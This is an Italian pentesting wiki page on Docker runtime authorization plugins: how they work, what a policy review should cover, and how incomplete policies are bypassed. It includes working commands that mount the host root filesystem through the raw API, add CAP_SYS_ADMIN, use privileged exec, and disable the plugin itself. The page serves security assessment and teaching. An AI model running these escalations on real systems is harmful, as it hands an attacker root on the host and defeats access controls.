# Plugin di autorizzazione runtime

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

I plugin di autorizzazione runtime sono un livello aggiuntivo di policy che decide se un chiamante può eseguire una determinata azione del daemon. Docker è l'esempio classico. Per impostazione predefinita, chiunque possa comunicare con il daemon Docker ne ha di fatto ampio controllo. I plugin di autorizzazione cercano di restringere questo modello esaminando l'utente autenticato e l'operazione API richiesta, quindi consentendo o negando la richiesta in base alla policy.

Questo argomento merita una pagina a sé perché cambia il modello di exploit quando un attaccante ha già accesso a un'API Docker o a un utente del gruppo `docker`. In questi ambienti, la domanda non è più soltanto "posso raggiungere il daemon?", ma anche "il daemon è protetto da un livello di autorizzazione e, in caso affermativo, è possibile aggirare quel livello tramite endpoint non gestiti, parsing JSON debole o permessi di gestione dei plugin?"

## Funzionamento

Quando una richiesta raggiunge il daemon Docker, il sottosistema di autorizzazione può passare il contesto della richiesta a uno o più plugin installati. Il plugin vede l'identità dell'utente autenticato, i dettagli della richiesta, gli header selezionati e parti del corpo della richiesta o della risposta quando il tipo di contenuto è adatto. È possibile concatenare più plugin e l'accesso viene concesso solo se tutti i plugin consentono la richiesta.

Questo modello sembra solido, ma la sua sicurezza dipende interamente da quanto a fondo l'autore della policy ha compreso l'API. Un plugin che blocca `docker run --privileged` ma ignora `docker exec`, non considera chiavi JSON alternative come `Binds` al livello superiore o consente la gestione dei plugin può creare una falsa impressione di restrizione, lasciando comunque aperte vie dirette di escalation dei privilegi.

## Obiettivi comuni dei plugin

Le aree importanti da esaminare durante la revisione della policy sono:

- endpoint di creazione dei container
- campi di `HostConfig` come `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` e le opzioni di condivisione dei namespace
- comportamento di `docker exec`
- endpoint di gestione dei plugin
- qualsiasi endpoint che possa attivare indirettamente azioni runtime al di fuori del modello di policy previsto

Storicamente, esempi come il plugin `authz` di Twistlock e semplici plugin didattici come `authobot` hanno reso questo modello facile da studiare, perché i relativi file di policy e percorsi del codice mostravano come veniva effettivamente implementata la mappatura tra endpoint e azioni. Per le attività di assessment, la lezione importante è che l'autore della policy deve comprendere l'intera superficie dell'API, non solo i comandi CLI più evidenti.

## Abuso

Il primo obiettivo è scoprire cosa viene effettivamente bloccato. Se il daemon nega un'azione, l'errore spesso leaks il nome del plugin, aiutando a identificare il controllo in uso:

```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```

Se hai bisogno di un profiling più ampio degli endpoint, strumenti come `docker_auth_profiler` sono utili perché automatizzano l'attività, altrimenti ripetitiva, di verificare quali route API e strutture JSON sono realmente consentite dal plugin.

Se l'ambiente usa un plugin personalizzato e puoi interagire con l'API, elenca i campi degli oggetti che vengono effettivamente filtrati:

```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```

Questi controlli sono importanti perché molti errori di autorizzazione riguardano campi specifici, non concetti generali. Un plugin può rifiutare un pattern CLI senza bloccare del tutto la struttura API equivalente.

### Esempio completo: `docker exec` aggiunge privilegi dopo la creazione del container

Una policy che blocca la creazione di container privilegiati, ma consente la creazione di container non confinati e `docker exec`, può comunque essere aggirata:

```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```

Se il daemon accetta il secondo passaggio, l'utente ha recuperato un processo interattivo con privilegi all'interno di un container che l'autore della policy riteneva limitato.

Una regola `sudo` ristretta può esporre lo stesso percorso anche quando il chiamante non può accedere direttamente al socket Docker. Per esempio, un'autorizzazione per `/usr/bin/docker exec *` con privilegi di root può consentire al chiamante di specificare le opzioni Docker `--privileged` e `--user root`. È comunque necessario che un container sia in esecuzione; su alcuni host Linux il suo ID è visibile nella riga di comando di un processo `containerd-shim` quando `docker ps` è negato. Considerate la regola come un indizio da approfondire: verificate la policy sudo effettiva, i controlli di autorizzazione del daemon, gli user namespace e se il processo risultante può raggiungere un dispositivo host o un mount host scrivibile. Docker documenta le opzioni di exec nella sua [documentazione di riferimento della CLI](https://docs.docker.com/reference/cli/docker/container/exec/).

Un wrapper eseguito come root che accetta un file Compose scelto dal chiamante deve convalidare l'intero [modello dei servizi Compose](https://docs.docker.com/reference/compose-file/services/), non limitarsi a rifiutare `privileged: true` e a richiedere `:ro` sui bind mount. Verificate `cap_add`, `security_opt`, i dispositivi, i namespace, gli input di build e ogni sintassi di volume supportata. Un bind mount in sola lettura può comunque diventare scrivibile dall'interno di un container con le capacità adeguate e un confinamento di sicurezza meno restrittivo, a seconda della policy del daemon e del kernel. Anche le allowlist dei percorsi host basate solo su prefissi e i controlli dei symlink sul componente finale del percorso richiedono un esame. Una regola sudo e una chiamata letterale a `docker-compose up` individuano un potenziale caso; la convalida effettiva del wrapper e le restrizioni del daemon in fase di esecuzione determinano se è sfruttabile.

### Esempio completo: bind mount tramite API raw

Alcune policy difettose esaminano una sola struttura JSON. Se il bind mount della root filesystem non viene bloccato in modo coerente, è ancora possibile montare l'host:

```bash
docker version
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```

La stessa idea può comparire anche in `HostConfig`:

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
  http:/v1.41/containers/create
```

L'impatto è una completa evasione dal filesystem dell'host. Il dettaglio interessante è che il bypass deriva da una copertura incompleta delle policy, non da un bug del kernel.

### Esempio completo: attributo di capability non controllato

Se la policy dimentica di filtrare un attributo relativo a una capability, l'attaccante può creare un container che riacquisisce una capability pericolosa:

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```

Una volta disponibili `CAP_SYS_ADMIN` o una capability altrettanto potente, diventano accessibili molte tecniche di breakout descritte in [capabilities.md](protections/capabilities.md) e [privileged-containers.md](privileged-containers.md).

### Esempio completo: disabilitare il plugin

Se sono consentite le operazioni di gestione dei plugin, il bypass più semplice potrebbe consistere nel disattivare del tutto il controllo:

```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```

Si tratta di un errore di policy a livello del control plane. Il livello di autorizzazione esiste, ma l'utente che avrebbe dovuto limitare conserva comunque il permesso di disabilitarlo.

## Verifiche

Questi comandi servono a identificare se esiste un livello di policy e se sembra completo o superficiale.

```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```

Cosa c'è di interessante:

- I messaggi di diniego che includono il nome di un plugin confermano la presenza di un livello di autorizzazione e spesso ne rivelano l'implementazione esatta.
- Un elenco di plugin visibile all'attaccante può bastare per scoprire se è possibile disabilitarli o riconfigurarli.
- Una policy che blocca solo le azioni CLI più ovvie, ma non le richieste API dirette, va considerata aggirabile finché non se ne dimostra il contrario.

## Impostazioni predefinite runtime

| Runtime / piattaforma | Stato predefinito | Comportamento predefinito | Indebolimenti manuali comuni |
| --- | --- | --- | --- |
| Docker Engine | Non abilitato per impostazione predefinita | L'accesso al daemon è di fatto tutto-o-niente, a meno che non sia configurato un plugin di autorizzazione | policy del plugin incomplete, blacklist anziché allowlist, gestione dei plugin consentita, punti ciechi a livello di campo |
| Podman | Non esiste un equivalente diretto comune | Podman si basa in genere maggiormente sui permessi Unix, sull'esecuzione rootless e sulle decisioni relative all'esposizione delle API che sui plugin authz in stile Docker | esposizione ampia di un'API Podman rootful, permessi deboli sul socket |
| containerd / CRI-O | Modello di controllo diverso | Questi runtime si affidano in genere ai permessi dei socket, ai confini di fiducia dei nodi e ai controlli degli orchestratori di livello superiore, anziché ai plugin authz di Docker | montare il socket nei workload, presupposti deboli sulla fiducia locale al nodo |
| Kubernetes | Usa authn/authz nei livelli API server e kubelet, non i plugin authz di Docker | RBAC del cluster e controlli di ammissione costituiscono il principale livello di policy | RBAC troppo permissivo, policy di ammissione debole, esposizione diretta delle API di kubelet o del runtime |

{{#include ../../../banners/hacktricks-training.md}}
